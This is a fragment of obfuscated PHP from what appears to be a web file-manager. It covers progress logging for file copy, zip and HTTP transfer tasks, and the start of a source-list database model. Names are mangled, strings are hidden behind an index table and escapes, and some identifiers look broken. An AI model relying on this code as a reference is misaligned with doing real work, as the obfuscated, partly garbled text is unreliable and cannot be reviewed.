$†ÛÄİÚô[$õ«ä„²©[1935]] = $†ÛÄİÚô[$õ«ä„²©[1992]] / $†ÛÄİÚô[$õ«ä„²©[873]]; if ($†ÛÄİÚô[$õ«ä„²©[1935]] > 0) { $ÈÖŸØîİ = timeFloat() - $†ÛÄİÚô[$õ«ä„²©[1937]] - $†ÛÄİÚô[$õ«ä„²©[1940]]; $†ÛÄİÚô[$õ«ä„²©[1941]] = $ÈÖŸØîİ * (1 - $†ÛÄİÚô[$õ«ä„²©[1935]]) / $†ÛÄİÚô[$õ«ä„²©[1935]]; } $úÕ°× ö = $†ÛÄİÚô[$õ«ä„²©[1988]] . $õ«ä„²©[955] . $†ÛÄİÚô[$õ«ä„²©[1987]] . "\x3b\40{$€—µš¢Ğ}\x3b" . $†ÛÄİÚô[$õ«ä„²©[1992]]; self::log($õ«ä„²©[1997] . $†ÛÄİÚô[$õ«ä„²©[1989]] . $õ«ä„²©[74] . $†ÛÄİÚô[$õ«ä„²©[1935]] . $õ«ä„²©[74] . $úÕ°× ö); } public function addPath($ı‘¿Üú™) { $å–ÄîÂÙ =& $_SERVER[”øäÃÍª]; if (!$ı‘¿Üú™) { return; } $¹ÕçÂšæ =& $this->task; $¼®ÎŞ™ = IO::infoWithChildren($ı‘¿Üú™); $Ô©°ñÌ÷ = $¹ÕçÂšæ[$å–ÄîÂÙ[1998]] ? $¹ÕçÂšæ[$å–ÄîÂÙ[1998]][$å–ÄîÂÙ[1999]] : 0; $¹ÕçÂšæ[$å–ÄîÂÙ[1998]] = array($å–ÄîÂÙ[1999] => $Ô©°ñÌ÷ + 1, $å–ÄîÂÙ[517] => $¼®ÎŞ™[$å–ÄîÂÙ[32]], $å–ÄîÂÙ[87] => $¼®ÎŞ™[$å–ÄîÂÙ[87]], $å–ÄîÂÙ[610] => $¼®ÎŞ™[$å–ÄîÂÙ[610]] ? $¼®ÎŞ™[$å–ÄîÂÙ[610]] : $¼®ÎŞ™[$å–ÄîÂÙ[87]]); if ($¼®ÎŞ™[$å–ÄîÂÙ[33]] == $å–ÄîÂÙ[230]) { $¹ÕçÂšæ[$å–ÄîÂÙ[1184]] += 1; } else { $¹ÕçÂšæ[$å–ÄîÂÙ[1184]] += $¼®ÎŞ™[$å–ÄîÂÙ[82]][$å–ÄîÂÙ[80]]; if ($¼®ÎŞ™[$å–ÄîÂÙ[191]]) { $¹ÕçÂšæ[$å–ÄîÂÙ[1184]] += $¼®ÎŞ™[$å–ÄîÂÙ[82]][$å–ÄîÂÙ[81]] + 1; } } $¹ÕçÂšæ[$å–ÄîÂÙ[873]] += $¼®ÎŞ™[$å–ÄîÂÙ[79]]; $this->update(); self::log(array($å–ÄîÂÙ[2000] . $ı‘¿Üú™, $¼®ÎŞ™)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ì®ŠÚ½Ì) { } public function sourceAddHashEnd($ªÎ×ºº) { } public function sourceAddFileStart($şš­ıŠú) { $½º×Ëîğ =& $_SERVER[”øäÃÍª]; $Ï±×£Ã¶ =& $this->task; $Ï±×£Ã¶[$½º×Ëîğ[1987]] = $şš­ıŠú[$½º×Ëîğ[79]]; $Ï±×£Ã¶[$½º×Ëîğ[1985]] = $şš­ıŠú[$½º×Ëîğ[32]]; $Ï±×£Ã¶[$½º×Ëîğ[1186]] = $şš­ıŠú[$½º×Ëîğ[32]]; $Ï±×£Ã¶[$½º×Ëîğ[2001]] = $şš­ıŠú[$½º×Ëîğ[87]]; $this->update(); self::log($½º×Ëîğ[2002] . $şš­ıŠú[$½º×Ëîğ[87]] . $½º×Ëîğ[2003] . $şš­ıŠú[$½º×Ëîğ[79]]); } public function sourceAddFileEnd($Ëˆ­Âş§) { $”’Œ‰Ä =& $_SERVER[”øäÃÍª]; $¼ÕÀÃÒ =& $this->task; $¼ÕÀÃÒ[$”’Œ‰Ä[1992]] += $Ëˆ­Âş§[$”’Œ‰Ä[79]]; $¼ÕÀÃÒ[$”’Œ‰Ä[2001]] = $Ëˆ­Âş§[$”’Œ‰Ä[87]]; $this->update(1); self::log($”’Œ‰Ä[2004] . $Ëˆ­Âş§[$”’Œ‰Ä[87]] . $”’Œ‰Ä[2003] . $Ëˆ­Âş§[$”’Œ‰Ä[79]] . $”’Œ‰Ä[2005]); } public function copyFileStart($°´Æ¬·, $‹Á€ÈÁË, $ØùššÔï, $’×’¯í¬, $ëÖ´¢, $ËÚ÷Óè‚) { $ôòñ€íÍ =& $_SERVER[”øäÃÍª]; $àà¯ú°Ú = $ëÖ´¢; if ($àà¯ú°Ú == $GLOBALS[$ôòñ€íÍ[2006]]) { $àà¯ú°Ú = $GLOBALS[$ôòñ€íÍ[2007]]; } $GLOBALS[$ôòñ€íÍ[2007]] = $ëÖ´¢; $GLOBALS[$ôòñ€íÍ[2006]] = $ËÚ÷Óè‚; $áÙÀ” =& $this->task; $áÙÀ”[$ôòñ€íÍ[1985]] = $àà¯ú°Ú; $áÙÀ”[$ôòñ€íÍ[1987]] = (int) $°´Æ¬·->size($‹Á€ÈÁË); $áÙÀ”[$ôòñ€íÍ[1988]] = 0; $áÙÀ”[$ôòñ€íÍ[1186]] = $ôòñ€íÍ[12]; $áÙÀ”[$ôòñ€íÍ[1989]] = $ôòñ€íÍ[12]; $áÙÀ”[$ôòñ€íÍ[1990]] = 0; $ŒõÕ ’ = $áÙÀ”[$ôòñ€íÍ[1987]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($áÙÀ”[$ôòñ€íÍ[487]] . $ôòñ€íÍ[2008]); if ($ŒõÕ ’ && file_exists(get_path_father($’×’¯í¬))) { Cache::set($áÙÀ”[$ôòñ€íÍ[487]] . $ôòñ€íÍ[2008], $’×’¯í¬); $áÙÀ”[$ôòñ€íÍ[1958]] = array($ôòñ€íÍ[2009], $ôòñ€íÍ[2010]); } $this->update(0, $ŒõÕ ’); self::log("\143\x6f\x70\171\106\x69\x6c\x65\x53\x74\x61\162\164\x3a{$‹Á€ÈÁË}\73"); } public static function updateCopyLocalFileSize($€Ş¶°âÑ) { $Üš‚¿â =& $_SERVER[”øäÃÍª]; $ò™šÀÎ÷ = Cache::get($€Ş¶°âÑ[$Üš‚¿â[487]] . $Üš‚¿â[2008]); if (!$ò™šÀÎ÷ || !file_exists($ò™šÀÎ÷)) { return $€Ş¶°âÑ; } $€Ş¶°âÑ[$Üš‚¿â[1988]] = @filesize($ò™šÀÎ÷); $€Ş¶°âÑ[$Üš‚¿â[1992]] += $€Ş¶°âÑ[$Üš‚¿â[1988]]; self::updateTask($€Ş¶°âÑ); return $€Ş¶°âÑ; } public function copyFileEnd($æ©¿ƒÏ÷, $Ü„¡ˆË, $Œ•Ì¡„, $Âã„ÉÕ”, $­Åşğª¹, $«¨İÒ¢Ş) { $ıˆğ™‘ =& $_SERVER[”øäÃÍª]; $³´Éí£ =& $this->task; $³´Éí£[$ıˆğ™‘[1988]] = $³´Éí£[$ıˆğ™‘[1987]]; $³´Éí£[$ıˆğ™‘[1989]] = $ıˆğ™‘[12]; unset($³´Éí£[$ıˆğ™‘[1958]]); if ($­Åşğª¹ == $³´Éí£[$ıˆğ™‘[1985]]) { $³´Éí£[$ıˆğ™‘[1991]] += $³´Éí£[$ıˆğ™‘[1987]]; $³´Éí£[$ıˆğ™‘[1992]] = $³´Éí£[$ıˆğ™‘[1991]]; $Œó¿ÎÍ¤ = 1; if (isset($³´Éí£[$ıˆğ™‘[2001]]) && $³´Éí£[$ıˆğ™‘[2001]] == $Ü„¡ˆË) { $Œó¿ÎÍ¤ = 0; } $this->update($Œó¿ÎÍ¤); } else { $this->update(); $³´Éí£[$ıˆğ™‘[1988]] = 0; } Cache::remove($³´Éí£[$ıˆğ™‘[487]] . $ıˆğ™‘[2008]); self::log($ıˆğ™‘[2011] . $Ü„¡ˆË . $ıˆğ™‘[73] . $Âã„ÉÕ” . $ıˆğ™‘[285] . $­Åşğª¹ . $ıˆğ™‘[2012] . $³´Éí£[$ıˆğ™‘[1985]]); } public function updateFileEnd($‚µêôêŒ, $àĞ¾¢©) { $Ú£ğàµ =& $_SERVER[”øäÃÍª]; $ÍÌïã© =& $this->task; $ÍÌïã©[$Ú£ğàµ[1985]] = $‚µêôêŒ; $ÍÌïã©[$Ú£ğàµ[1987]] = $àĞ¾¢©; $ÍÌïã©[$Ú£ğàµ[1991]] += $àĞ¾¢©; $ÍÌïã©[$Ú£ğàµ[1992]] = $ÍÌïã©[$Ú£ğàµ[1991]]; $this->update(1); self::log($Ú£ğàµ[2013] . $‚µêôêŒ); } public function sourceModelCopy($ÓÔáäŒ) { $ô¯ÄÌ½Á =& $_SERVER[”øäÃÍª]; $ÙşÊ«ô = $ÓÔáäŒ[0]; $ñÏÒ™”‹ = $ÓÔáäŒ[1]; $…†èˆ”º =& $this->task; $this->sourceModelCopyFlag = !0; $š£¹¼‰¬ = 0; switch ($ÙşÊ«ô) { case $ô¯ÄÌ½Á[665]: $š£¹¼‰¬ = 1; break; case $ô¯ÄÌ½Á[668]: $…†èˆ”º[$ô¯ÄÌ½Á[1985]] = $ñÏÒ™”‹[$ô¯ÄÌ½Á[32]]; break; case $ô¯ÄÌ½Á[670]: $š£¹¼‰¬ = intval($ÓÔáäŒ[$ô¯ÄÌ½Á[467]] * 0.4); break; case $ô¯ÄÌ½Á[672]: $š£¹¼‰¬ = intval($ÓÔáäŒ[$ô¯ÄÌ½Á[467]] * 0.2); break; case $ô¯ÄÌ½Á[674]: $š£¹¼‰¬ = intval($ÓÔáäŒ[$ô¯ÄÌ½Á[467]] * 0.4); break; } $this->update($š£¹¼‰¬); self::log(array("{$ÙşÊ«ô}\73\x61\x64\144\75{$š£¹¼‰¬}", $ÓÔáäŒ)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($“÷ªøõ, $Œü£‡Ä‰) { $ÒÇ¾ôÕó =& $_SERVER[”øäÃÍª]; $this->sourceModelCopyFlag = !0; $š°àÚ = 1; if (isset($“÷ªøõ[$ÒÇ¾ôÕó[82]])) { $š°àÚ = $“÷ªøõ[$ÒÇ¾ôÕó[82]][$ÒÇ¾ôÕó[80]]; $š°àÚ = $š°àÚ + $“÷ªøõ[$ÒÇ¾ôÕó[82]][$ÒÇ¾ôÕó[81]] + 1; } $this->update($š°àÚ); $this->sourceModelCopyFlag = !1; $this->log(array($ÒÇ¾ôÕó[2014], $š°àÚ, $“÷ªøõ)); } public function sourceMove($˜¾²Ò†ˆ) { $this->sourceRemove($˜¾²Ò†ˆ, !1); } public function curlProgress($ŞÎìÄ¤¿, $õ€’ÍßÏ, $éœø”ì´, $äÍİÓ–Ğ, $ÖÂŠËóö) { $¬¥½°åö =& $_SERVER[”øäÃÍª]; $ÊğÚ¥î =& $this->task; if ($ÖÂŠËóö > 0) { $ÊğÚ¥î[$¬¥½°åö[1186]] = $¬¥½°åö[2015]; $ÊğÚ¥î[$¬¥½°åö[1989]] = $¬¥½°åö[107]; if ($ÊğÚ¥î[$¬¥½°åö[1987]]) { $ÊğÚ¥î[$¬¥½°åö[1988]] = $ÖÂŠËóö; } if ($ÊğÚ¥î[$¬¥½°åö[1990]]) { $ÊğÚ¥î[$¬¥½°åö[1988]] = $ÖÂŠËóö + $ÊğÚ¥î[$¬¥½°åö[1990]]; } } else { if ($éœø”ì´ > 0) { if ($ÊğÚ¥î[$¬¥½°åö[1987]] == $õ€’ÍßÏ) { $ÊğÚ¥î[$¬¥½°åö[1988]] = $éœø”ì´; $ÊğÚ¥î[$¬¥½°åö[1186]] = $¬¥½°åö[2016]; $ÊğÚ¥î[$¬¥½°åö[1989]] = $¬¥½°åö[1337]; } } } $this->update(); $¬şíîÊ³ = "\144\157\x77\x6e\72{$éœø”ì´}\57{$õ€’ÍßÏ}\73\x20\165\x70\154\x6f\x61\x64\72{$ÖÂŠËóö}\x2f{$äÍİÓ–Ğ}\73\x66\x69\x6c\145\x3d" . $ÊğÚ¥î[$¬¥½°åö[1987]]; self::log(array($¬¥½°åö[2017] . $¬şíîÊ³ . $¬¥½°åö[74] . $ÊğÚ¥î[$¬¥½°åö[1985]], curl_getinfo($ŞÎìÄ¤¿))); } public function curlProgressStart($àñ™­Ïí) { } public function curlProgressEnd($¾ıÈ­¡) { $ÓÉË¼º =& $_SERVER[”øäÃÍª]; $ûÉ­´÷ö =& $this->task; $µïËÁğÔ = curl_getinfo($¾ıÈ­¡); $åõæ‡°à = $µïËÁğÔ[$ÓÉË¼º[2018]]; if ($åõæ‡°à == -1) { $åõæ‡°à = $µïËÁğÔ[$ÓÉË¼º[2019]]; } if ($ûÉ­´÷ö[$ÓÉË¼º[1989]] == $ÓÉË¼º[107] && $åõæ‡°à) { $ûÉ­´÷ö[$ÓÉË¼º[1990]] += $åõæ‡°à; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $†ÍØ¥± =& $_SERVER[”øäÃÍª]; $í’»ï¾ï =& $this->task; $í’»ï¾ï[$†ÍØ¥±[2020]] = 1; Hook::bind($†ÍØ¥±[1979], array($this, $†ÍØ¥±[2021])); Hook::bind($†ÍØ¥±[1981], array($this, $†ÍØ¥±[2022])); Hook::bind($†ÍØ¥±[1983], array($this, $†ÍØ¥±[2023])); } protected function endAfter() { $øøÖ÷ =& $_SERVER[”øäÃÍª]; Hook::unbind($øøÖ÷[1979], array($this, $øøÖ÷[2021])); Hook::unbind($øøÖ÷[1981], array($this, $øøÖ÷[2022])); Hook::unbind($øøÖ÷[1983], array($this, $øøÖ÷[2023])); } public function progressStart($áÙƒ¦œœ) { $ËÑãŒ‰ù =& $_SERVER[”øäÃÍª]; $©™èéŒû = curl_getinfo($áÙƒ¦œœ); self::log($ËÑãŒ‰ù[2024] . $©™èéŒû[$ËÑãŒ‰ù[382]]); self::valueSet($this->task[$ËÑãŒ‰ù[487]], $this->task); } public function progressEnd($şéÑ‹¸¾) { $¢¦ö¼©¨ =& $_SERVER[”øäÃÍª]; self::log($¢¦ö¼©¨[2025] . $this->task[$¢¦ö¼©¨[487]]); $this->end(); } public function progress($ñÚùµ‘Î, $øªÉŒç±, $Îô®äá, $¢â÷ƒı, $¸öĞ¿‡) { $Œ˜ûÔÏ“ =& $_SERVER[”øäÃÍª]; $õê½É”‚ =& $this->task; if ($¸öĞ¿‡ > 0) { $õê½É”‚[$Œ˜ûÔÏ“[1184]] = $õê½É”‚[$Œ˜ûÔÏ“[1184]] == 0 ? $¢â÷ƒı : $õê½É”‚[$Œ˜ûÔÏ“[1184]]; $õê½É”‚[$Œ˜ûÔÏ“[1934]] = $¸öĞ¿‡; } else { if ($Îô®äá > 0) { $õê½É”‚[$Œ˜ûÔÏ“[1184]] = $õê½É”‚[$Œ˜ûÔÏ“[1184]] == 0 ? $øªÉŒç± : $õê½É”‚[$Œ˜ûÔÏ“[1184]]; $õê½É”‚[$Œ˜ûÔÏ“[1934]] = $Îô®äá; } } $this->update(); self::log("\x70\162\157\x67\162\145\x73\163\110\164\x74\x70\x3a\x64\157\x77\156\72{$Îô®äá}\x2f{$øªÉŒç±}\x3b\40\x75\160\154\x6f\141\144\72{$¸öĞ¿‡}\x2f{$¢â÷ƒı}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($šñ‡¿ƒË, $‹‘­•ùÍ = '', $¥âˆûÅˆ = 0, $öÀø£° = '') { $Ï˜“âá“ =& $_SERVER[”øäÃÍª]; $öÀø£° = $öÀø£° ? $öÀø£° : ($‹‘­•ùÍ ? $‹‘­•ùÍ : $šñ‡¿ƒË); $ÀÀƒÔŸü = new Task($šñ‡¿ƒË, $‹‘­•ùÍ, $¥âˆûÅˆ, $öÀø£°); $GLOBALS[$Ï˜“âá“[2026] . $šñ‡¿ƒË] = new TaskLog($Ï˜“âá“[1918], $ÀÀƒÔŸü, $öÀø£°); return $ÀÀƒÔŸü; } public function __construct($ã”áÖ± = '', $ñáİÊÛ÷ = '', $ÎµÇøõô = '') { $Ÿ§Àá°µ =& $_SERVER[”øäÃÍª]; if (!$ã”áÖ±) { $ã”áÖ± = $Ÿ§Àá°µ[1918]; } $âùô·°Ì = $ã”áÖ± . $Ÿ§Àá°µ[476] . rand_string(10); if (!$ÎµÇøõô) { $ÎµÇøõô = $ã”áÖ± . $Ÿ§Àá°µ[53] . $ÎµÇøõô; } switch ($ã”áÖ±) { case $Ÿ§Àá°µ[1918]: if (!$ñáİÊÛ÷ || !$ñáİÊÛ÷->task) { return echoLog($ã”áÖ± . $Ÿ§Àá°µ[2027]); } $Øë¿Ê‚ = $ñáİÊÛ÷; $âùô·°Ì = $Øë¿Ê‚->task[$Ÿ§Àá°µ[487]]; $ã”áÖ± = $Øë¿Ê‚->task[$Ÿ§Àá°µ[487]]; if (!$Øë¿Ê‚->task[$Ÿ§Àá°µ[1819]]) { $Øë¿Ê‚->task[$Ÿ§Àá°µ[1819]] = $ÎµÇøõô ? $ÎµÇøõô : $ã”áÖ±; } break; case $Ÿ§Àá°µ[2028]: if (!$ñáİÊÛ÷) { return echoLog($ã”áÖ± . $Ÿ§Àá°µ[2029]); } $†âœ€ÚÀ = is_string($ñáİÊÛ÷) ? array($ñáİÊÛ÷) : $ñáİÊÛ÷; $Øë¿Ê‚ = new TaskFileTransfer($âùô·°Ì, $ã”áÖ±, 0, $ÎµÇøõô ? $ÎµÇøõô : $†âœ€ÚÀ[0]); foreach ($†âœ€ÚÀ as $¾¡½Ğ¦Ì) { $Øë¿Ê‚->addPath($¾¡½Ğ¦Ì); } break; case $Ÿ§Àá°µ[388]: if (!$ñáİÊÛ÷) { return echoLog($ã”áÖ± . $Ÿ§Àá°µ[2029]); } $†âœ€ÚÀ = is_string($ñáİÊÛ÷) ? array($ñáİÊÛ÷) : $ñáİÊÛ÷; $Øë¿Ê‚ = new TaskZip($âùô·°Ì, $ã”áÖ±, 0, $ÎµÇøõô ? $ÎµÇøõô : $†âœ€ÚÀ[0]); foreach ($†âœ€ÚÀ as $¾¡½Ğ¦Ì) { $Øë¿Ê‚->addPath($¾¡½Ğ¦Ì); } break; case $Ÿ§Àá°µ[1357]: if (!$ñáİÊÛ÷) { return echoLog($ã”áÖ± . $Ÿ§Àá°µ[2029]); } $Øë¿Ê‚ = new TaskUnZip($âùô·°Ì, $ã”áÖ±, 0, $ÎµÇøõô ? $ÎµÇøõô : $ñáİÊÛ÷); if ($ñáİÊÛ÷) { $Øë¿Ê‚->addFile($ñáİÊÛ÷); } break; case $Ÿ§Àá°µ[149]: $Øë¿Ê‚ = new TaskHttp($âùô·°Ì, $ã”áÖ±); break; default: return; break; } $this->task = $Øë¿Ê‚; $this->taskID = $âùô·°Ì; Hook::bind($Ÿ§Àá°µ[1954], array($this, $Ÿ§Àá°µ[2030])); Hook::bind($Ÿ§Àá°µ[1956], array($this, $Ÿ§Àá°µ[2031])); Hook::bind($Ÿ§Àá°µ[1950], array($this, $Ÿ§Àá°µ[2032])); echoLog($Ÿ§Àá°µ[2033] . $Øë¿Ê‚->task[$Ÿ§Àá°µ[1819]]); } public function __destruct() { $this->end(); } public function end($îÑî÷Ä = '') { $åâèş¯î =& $_SERVER[”øäÃÍª]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($îÑî÷Ä); $this->task = !1; $this->taskID = !1; Hook::unbind($åâèş¯î[1954], array($this, $åâèş¯î[2030])); Hook::unbind($åâèş¯î[1956], array($this, $åâèş¯î[2031])); Hook::unbind($åâèş¯î[1950], array($this, $åâèş¯î[2032])); } public function taskUpdate($«æ¼˜) { $á¾Í¤Ûí =& $_SERVER[”øäÃÍª]; if (!$«æ¼˜ || $this->taskID != $«æ¼˜[$á¾Í¤Ûí[487]]) { return; } $ÃŞúÅ‚Ä = 20; $÷ùÆ¬ñ = intval($«æ¼˜[$á¾Í¤Ûí[1935]] * $ÃŞúÅ‚Ä); $ç’Èºä€ = $á¾Í¤Ûí[173] . str_repeat($á¾Í¤Ûí[464], $÷ùÆ¬ñ) . $á¾Í¤Ûí[1136] . str_repeat($á¾Í¤Ûí[53], $ÃŞúÅ‚Ä - $÷ùÆ¬ñ) . $á¾Í¤Ûí[175]; $©¼åå” = $ç’Èºä€ . sprintf($á¾Í¤Ûí[2034], $«æ¼˜[$á¾Í¤Ûí[1935]] * 100) . $á¾Í¤Ûí[2035]; $ˆŒ¿À‘µ = $©¼åå” . $«æ¼˜[$á¾Í¤Ûí[1934]] . $á¾Í¤Ûí[8] . $«æ¼˜[$á¾Í¤Ûí[1184]] . LNG($á¾Í¤Ûí[2036]); $äëêÌç÷ = $á¾Í¤Ûí[12]; if ($«æ¼˜[$á¾Í¤Ûí[2020]]) { $ˆŒ¿À‘µ = $©¼åå” . size_format($«æ¼˜[$á¾Í¤Ûí[1934]]) . $á¾Í¤Ûí[8] . size_format($«æ¼˜[$á¾Í¤Ûí[1184]]); $äëêÌç÷ = size_format($«æ¼˜[$á¾Í¤Ûí[1936]]) . $á¾Í¤Ûí[2037]; } if ($«æ¼˜[$á¾Í¤Ûí[1186]]) { $«æ¼˜[$á¾Í¤Ûí[1985]] = $«æ¼˜[$á¾Í¤Ûí[1186]] . $á¾Í¤Ûí[53] . $«æ¼˜[$á¾Í¤Ûí[1985]]; } if ($«æ¼˜[$á¾Í¤Ûí[1985]]) { $õ·Ò€Â = $á¾Í¤Ûí[12]; if ($«æ¼˜[$á¾Í¤Ûí[1987]]) { $õ·Ò€Â = $á¾Í¤Ûí[50] . size_format($«æ¼˜[$á¾Í¤Ûí[1988]]) . $á¾Í¤Ûí[8] . size_format($«æ¼˜[$á¾Í¤Ûí[1987]]); } $äëêÌç÷ .= $«æ¼˜[$á¾Í¤Ûí[1985]] . $õ·Ò€Â; } if ($«æ¼˜[$á¾Í¤Ûí[873]] && !$«æ¼˜[$á¾Í¤Ûí[1987]]) { $äëêÌç÷ .= $á¾Í¤Ûí[53] . size_format($«æ¼˜[$á¾Í¤Ûí[1992]]) . $á¾Í¤Ûí[8] . size_format($«æ¼˜[$á¾Í¤Ûí[873]]); } echoLog($ˆŒ¿À‘µ . $á¾Í¤Ûí[53] . $äëêÌç÷, !0); } public function taskEnd($ºµ»±ã) { $úß‚“§ =& $_SERVER[”øäÃÍª]; if (!$ºµ»±ã || $this->taskID != $ºµ»±ã[$úß‚“§[487]]) { return; } $ÊÇ’óÛ = $ºµ»±ã ? LNG($úß‚“§[2038]) . $úß‚“§[4] . $ºµ»±ã[$úß‚“§[1934]] . $úß‚“§[8] . $ºµ»±ã[$úß‚“§[1184]] . LNG($úß‚“§[2036]) . $úß‚“§[74] : $úß‚“§[12]; echoLog($úß‚“§[2039] . $ºµ»±ã[$úß‚“§[1819]] . ($ºµ»±ã[$úß‚“§[548]] ? $úß‚“§[74] . $ºµ»±ã[$úß‚“§[548]] : $úß‚“§[12]) . $úß‚“§[74] . $ÊÇ’óÛ . $úß‚“§[2040] . sprintf($úß‚“§[971], timeFloat() - $ºµ»±ã[$úß‚“§[1937]]) . $úß‚“§[1949]); $this->end(); } public function taskKill($Ş¼Šİ•Ø) { $İµØÃŸ =& $_SERVER[”øäÃÍª]; if (!$Ş¼Šİ•Ø || $this->taskID != $Ş¼Šİ•Ø[$İµØÃŸ[487]]) { return; } echoLog($İµØÃŸ[2041] . $Ş¼Šİ•Ø[$İµØÃŸ[1819]]); } } goto eÖÚ‹©¿; A¾”‚ïšëè: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\143\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\141\155\x65" => "\151\157\x5f\x73\157\x75\x72\x63\145\137\155\145\x74\x61", "\x6d\x65\x74\x61\x46\151\x65\x6c\144" => "\x73\157\x75\162\x63\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\x54\x69\x6d\x65", "\164\151\155\145", "\151\x6e\x73\145\x72\164", "\x66\x75\x6e\143\x74\x69\157\156"), array("\x63\x72\145\x61\164\x65\x54\151\155\145", "\x74\x69\155\145", "\151\156\163\145\x72\x74", "\146\165\156\x63\x74\x69\157\x6e"), array("\x76\x69\x65\167\x54\x69\155\x65", "\164\x69\155\x65", "\151\x6e\x73\145\x72\164", "\x66\165\x6e\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ëôÛä) { return $this->listSource(array($_SERVER[”øäÃÍª][500] => $ëôÛä)); } public function typeName($Ñ¾€¾ ‰) { static $ü×Ğ¦‹ = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\x6d", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $ü×Ğ¦‹[$Ñ¾€¾ ‰ . $_SERVER[”øäÃÍª][12]]; } public function sourceListInfo($¿é§¯€, $ÕÏ®ÏÉÏ = false) { $òÎ×¢¶Ö =& $_SERVER[”øäÃÍª]; $¿é§¯€ = $¿é§¯€ ? $¿é§¯€ : array(); $¿é§¯€ = array_filter(array_unique($¿é§¯€)); if (!$¿é§¯€) { return array(); } $Íù”úÌí = $this->where(array($òÎ×¢¶Ö[191] => array($òÎ×¢¶Ö[7], $¿é§¯€)))->select(); $this->_listDataApply($Íù”úÌí, $ÕÏ®ÏÉÏ); return array_to_keyvalue($Íù”úÌí, $òÎ×¢¶Ö[191]); } public function pathInfoFilter(&$ïÎß•®) { $—ßñ†¡ =& $_SERVER[”øäÃÍª]; static $ÌÆóóãç = false; static $–½Åç› = false; static $×ÄğËï¿ = false; if (!$ÌÆóóãç) { $ï©Ğ×şğ = $—ßñ†¡[501]; $ï©Ğ×şğ .= $—ßñ†¡[502]; $ï©Ğ×şğ .= $—ßñ†¡[503]; $ÀÒ¶›´İ = $—ßñ†¡[504]; $‡Ş·ˆ«³ = explode($—ßñ†¡[50], $ÀÒ¶›´İ); $ÌÆóóãç = explode($—ßñ†¡[50], $ï©Ğ×şğ); $–½Åç› = array(); foreach ($ÌÆóóãç as $Ã²€âº) { if (in_array($Ã²€âº, $‡Ş·ˆ«³)) { continue; } $–½Åç›[] = $Ã²€âº; } $×ÄğËï¿ = explode($—ßñ†¡[50], $—ßñ†¡[505]); } foreach ($×ÄğËï¿ as $À²ƒ÷°†) { if (isset($ïÎß•®[$À²ƒ÷°†])) { $ïÎß•®[$À²ƒ÷°†] = intval($ïÎß•®[$À²ƒ÷°†]); } } $ïÎß•®[$—ßñ†¡[87]] = $—ßñ†¡[506] . $ïÎß•®[$—ßñ†¡[191]] . $—ßñ†¡[507]; $ïÎß•®[$—ßñ†¡[33]] = $ïÎß•®[$—ßñ†¡[508]] == 1 ? $—ßñ†¡[78] : $—ßñ†¡[230]; $ïÎß•®[$—ßñ†¡[188]] = $this->typeName($ïÎß•®[$—ßñ†¡[188]]); if ($ïÎß•®[$—ßñ†¡[508]] != 1) { $ïÎß•®[$—ßñ†¡[166]] = $ïÎß•®[$—ßñ†¡[509]]; unset($ïÎß•®[$—ßñ†¡[509]]); } $Ì®‘¼æ = $ÌÆóóãç; if (isset($ïÎß•®[$—ßñ†¡[510]]) && $ïÎß•®[$—ßñ†¡[510]][$—ßñ†¡[511]] == -1) { $Ì®‘¼æ = $–½Åç›; } $ïÎß•® = array_field_key($ïÎß•®, $Ì®‘¼æ); return $ïÎß•®; } public function listUserFav() { $¢Î£¦åÄ =& $_SERVER[”øäÃÍª]; $´Ã“Æ²‚ = Model($¢Î£¦åÄ[512])->listData(); $üŸ£óƒ‡ = array_filter_by_field($´Ã“Æ²‚, $¢Î£¦åÄ[33], $¢Î£¦åÄ[513]); $üŸ£óƒ‡ = array_to_keyvalue($üŸ£óƒ‡, $¢Î£¦åÄ[12], $¢Î£¦åÄ[87]); if ($üŸ£óƒ‡) { $é²¦İ•… = $this->listSource(array($¢Î£¦åÄ[514] => array($¢Î£¦åÄ[515], $üŸ£óƒ‡))); } $é²¦İ•… = array_to_keyvalue($é²¦İ•…[$¢Î£¦åÄ[446]], $¢Î£¦åÄ[191]); foreach ($´Ã“Æ²‚ as &$è‚ŒÍß) { $è‚ŒÍß = array($¢Î£¦åÄ[516] => $è‚ŒÍß[$¢Î£¦åÄ[487]], $¢Î£¦åÄ[517] => $è‚ŒÍß[$¢Î£¦åÄ[32]], $¢Î£¦åÄ[518] => $è‚ŒÍß[$¢Î£¦åÄ[87]], $¢Î£¦åÄ[519] => $è‚ŒÍß[$¢Î£¦åÄ[33]], $¢Î£¦åÄ[520] => $è‚ŒÍß[$¢Î£¦åÄ[231]], $¢Î£¦åÄ[521] => $è‚ŒÍß[$¢Î£¦åÄ[88]]); if ($è‚ŒÍß[$¢Î£¦åÄ[33]] == $¢Î£¦åÄ[513] && $é²¦İ•…[$è‚ŒÍß[$¢Î£¦åÄ[87]]]) { $è‚ŒÍß[$¢Î£¦åÄ[90]] = $é²¦İ•…[$è‚ŒÍß[$¢Î£¦åÄ[87]]]; } } unset($è‚ŒÍß); return $´Ã“Æ²‚; } public function listUserTag($¶ÙÈŠÓÌ) { $»Åà”Ñ¹ =& $_SERVER[”øäÃÍª]; if ($¶ÙÈŠÓÌ && !is_array($¶ÙÈŠÓÌ)) { $¶ÙÈŠÓÌ = array($¶ÙÈŠÓÌ); } $¦²ˆ¥ª = Model($»Åà”Ñ¹[522])->listData(); $Ó•¢Çà = array(); $†¥¾ö¨ = array(); foreach ($¦²ˆ¥ª as $®Ï½‘¬²) { $Ÿ›ı¯¥µ = $®Ï½‘¬²[$»Åà”Ñ¹[87]]; if (!$Ÿ›ı¯¥µ) { continue; } if (!isset($†¥¾ö¨[$Ÿ›ı¯¥µ])) { 